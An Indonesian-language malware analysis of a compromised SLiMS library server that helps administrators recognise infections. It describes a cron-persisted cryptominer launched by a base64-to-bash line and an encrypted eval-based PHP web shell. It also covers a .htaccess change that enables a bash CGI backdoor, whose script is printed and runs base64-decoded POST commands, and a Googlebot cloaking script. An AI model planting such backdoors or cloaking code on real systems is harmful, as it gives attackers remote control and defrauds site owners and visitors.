# 🔬 Studi Kasus 1: Ciri dan Cara Kerja Malware pada SLiMS Bulian

Dokumen ini menganalisis anatomi serangan siber berlapis pada instalasi SLiMS. Studi kasus ini membedah tiga jenis malware berbeda yang ditemukan, cara kerjanya, dan jejak yang ditinggalkan penyerang. Tujuannya adalah untuk memberikan pemahaman mendalam agar administrator sistem dapat mengenali tanda-tanda serupa.

## 🕵️ Profil Penyerang dan Vektor Serangan

* **🆔 Atribusi Penyerang**: Aktivitas serangan diidentifikasi berasal dari grup yang menamakan dirinya "Team Anon Force", terdeteksi melalui signature `User-Agent` unik yang mereka gunakan saat memindai server.
* **🛠️ Taktik**: Penyerang menggunakan alat pemindai otomatis untuk mencari kelemahan umum pada aplikasi web, tidak hanya SLiMS tetapi juga CMS lain seperti WordPress.
* **🔓 Vektor Serangan Utama**: Celah keamanan yang dieksploitasi bukanlah dari SLiMS itu sendiri, melainkan dari konfigurasi server yang lemah, terutama:
    * **Izin File yang Lemah**: Pengguna web server (`www-data`) memiliki hak tulis yang berlebihan, memungkinkan penyerang untuk membuat dan memodifikasi file di berbagai direktori.
    * **Kelemahan Unggah File**: Adanya kemungkinan celah pada komponen atau direktori yang tidak aman sehingga memungkinkan penyerang mengunggah skrip berbahaya.

## ⛏️ Ancaman #1: Malware Penambang Kripto (Persistensi Jangka Panjang)

Ini adalah infeksi paling lama dan paling tersembunyi, telah aktif selama lebih dari dua tahun tanpa terdeteksi.

### 👀 Ciri-ciri
* Penggunaan CPU server yang tinggi dan tidak wajar.
* Ditemukannya file binary mencurigakan berukuran besar (~2.8MB) di direktori tersembunyi.
* Adanya tugas terjadwal (*cron job*) yang tidak dikenal pada pengguna sistem `www-data`.

### ⚙️ Cara Kerja
1.  **⏰ Persistensi melalui Cron Job**: Malware ini memastikan dirinya tetap aktif dengan menambahkan sebuah perintah pada `cron tab` milik user `www-data`. Perintah ini diatur untuk berjalan secara otomatis setiap jam.
2.  **🎭 Obfuscation (Penyamaran)**: Perintah di dalam `cron` disamarkan menggunakan `base64` agar tidak mudah dibaca oleh administrator sistem.
3.  **👻 Eksekusi Tersembunyi**: Perintah `cron` tersebut akan mendekode dan menjalankan file binary malware.
4.  **🥸 Menyamarkan Proses**: Setelah berjalan, proses malware ini menyamarkan dirinya sebagai proses kernel yang terlihat normal, seperti `[raid5wq]`, untuk menghindari deteksi saat administrator memeriksa proses yang aktif.

**Contoh Skrip di Crontab (`www-data`)**
```bash
# PERINGATAN: INI ADALAH CONTOH KODE BERBAHAYA
# Perintah ini mendekode string base64 yang panjang (dipotong di sini) 
# lalu menjalankannya melalui bash.
0 * * * * { echo L3Vz...udWxsAo=|base64 -d|bash;} 2>/dev/null #defunct-kernel
```

## 🚪 Ancaman #2: Backdoor & Web Shell (Akses Penuh ke Server)

Penyerang menanamkan setidaknya dua jenis backdoor berbeda untuk memastikan mereka selalu memiliki akses ke server.

### 📄 Jenis A: Web Shell PHP Terenkripsi (Contoh: `betawinesec.php`)

Ini adalah backdoor dalam satu file PHP yang sangat sulit dianalisis karena teknik penyamaran berlapis.

* **Ciri-ciri**: Sebuah file PHP dengan ukuran besar (~1.5MB) yang isinya tampak seperti teks acak.
* **Cara Kerja (Teknik Obfuscation 🪆)**:
    * **Lapisan Enkripsi**: Kode inti dienkripsi menggunakan metode enkripsi kuat seperti AES-256-CBC.
    * **Lapisan Kompresi**: Data terenkripsi tersebut kemudian dikompres menggunakan `gzuncompress` untuk membuatnya lebih kecil.
    * **Lapisan Eksekusi**: Fungsi `eval()` digunakan sebagai pemicu akhir untuk mendekripsi, mendekompresi, dan kemudian menjalankan kode berbahaya yang tersembunyi. Alurnya adalah: Teks Acak ➡️ didekripsi ➡️ didekompresi ➡️ Kode PHP Jahat ➡️ dieksekusi ⚡️.

**Contoh Konseptual Skrip Web Shell Terenkripsi**
```php
<?php
// PERINGATAN: INI ADALAH CONTOH KONSEPTUAL DARI KODE BERBAHAYA

// Layer 3: Payload yang dienkripsi dan dikompres (string acak)
$encrypted_payload = '... string panjang berisi kode terenkripsi ...';
$key = 'kunci_rahasia_penyerang';
$iv = '... initialization vector ...';

// Layer 2: Dekripsi dan Dekompresi
$decrypted_payload = openssl_decrypt($encrypted_payload, 'aes-256-cbc', $key, 0, $iv);
$uncompressed_code = gzuncompress($decrypted_payload);

// Layer 1: Eksekusi kode berbahaya yang sudah bersih
eval($uncompressed_code); 
?>
```

### 🧰 Jenis B: ALFA Backdoor Suite

Ini adalah kumpulan skrip yang lebih canggih, memberikan penyerang fleksibilitas untuk menjalankan perintah menggunakan berbagai bahasa pemrograman.

* **Ciri-ciri**:
    * Ditemukannya direktori aneh (misal: `ALFA_DATA`) di dalam direktori SLiMS yang seharusnya tidak dapat dieksekusi, seringkali disamarkan di dalam direktori `files` atau `repository`.
    * Berisi beberapa file skrip seperti `py.alfa` (Python), `bash.alfa` (Bash), dan `perl.alfa` (Perl).
    * Terdapat modifikasi pada file `.htaccess` yang menyertakan "tanda tangan" dari pembuatnya, seperti "Sole Sad & Invisible".
* **Cara Kerja**: Penyerang memodifikasi `.htaccess` untuk mengaktifkan `ExecCGI` dan menambahkan `AddHandler` untuk ekstensi `.alfa`. Ini memerintahkan server untuk mengeksekusi file-file tersebut sebagai skrip.

**Contoh Skrip `.htaccess`**
```apache
# PERINGATAN: INI ADALAH CONTOH KONFIGURASI BERBAHAYA
# Signature: Sole Sad & Invisible
Options +ExecCGI
AddHandler cgi-script .alfa
```

**Contoh Konseptual Skrip `bash.alfa`**
```bash
#!/bin/bash
# PERINGATAN: INI ADALAH CONTOH KONSEPTUAL DARI KODE BERBAHAYA

echo "Content-Type: text/plain"
echo ""

# Membaca data yang dikirim oleh penyerang melalui POST
read POST_STRING

# Mendekode perintah dari base64 dan menjalankannya
COMMAND=$(echo "$POST_STRING" | base64 -d)
eval "$COMMAND"
```

## 🎣 Ancaman #3: Parasite SEO & Cloaking (Manipulasi Mesin Pencari)

Ini adalah tujuan akhir dari serangan setelah penyerang mendapatkan akses, yaitu memanfaatkan reputasi domain untuk mempromosikan konten spam.

### 👀 Ciri-ciri
* File `index.php` di direktori utama dimodifikasi, sedangkan file `index.php` di semua subfolder dihapus.
* Terdapat **file PHP baru** (misalnya, `home.php`) yang berfungsi sebagai halaman spam, berisi kode HTML kompleks yang dioptimalkan untuk SEO.
* Saat dicek di Google, situs Anda muncul untuk kata kunci judi, namun saat dikunjungi langsung, tampilannya normal.

### ⚙️ Cara Kerja
1.  **🎭 Cloaking**: Skrip `index.php` yang telah dimodifikasi berisi logika untuk mendeteksi pengunjung. Ia memeriksa `User-Agent` dari setiap permintaan yang masuk.
2.  **📈 Parasite SEO**: File `home.php` sengaja dirancang untuk mendapat peringkat tinggi di Google. File ini diisi dengan kata kunci, tautan keluar, dan metadata *Structured Data* (JSON-LD) yang relevan dengan judi online. Dengan "membonceng" pada domain Anda yang mungkin memiliki reputasi baik, halaman spam ini bisa dengan cepat muncul di halaman pertama hasil pencarian.

**Contoh Konseptual Skrip Cloaking di `index.php`**
```php
<?php
// PERINGATAN: INI ADALAH CONTOH KONSEPTUAL DARI KODE BERBAHAYA

$user_agent = $_SERVER['HTTP_USER_AGENT'];
$bot_list = array("Googlebot", "Bingbot", "YandexBot");
$is_bot = false;

foreach ($bot_list as $bot) {
    if (stripos($user_agent, $bot) !== false) {
        $is_bot = true;
        break;
    }
}

if ($is_bot) {
    // 🤖 Jika bot, tampilkan halaman spam SEO
    include 'home.php'; 
} else {
    // 👤 Jika pengunjung biasa, tampilkan konten SLiMS yang asli
    include 'old.php'; 
}
?>
```
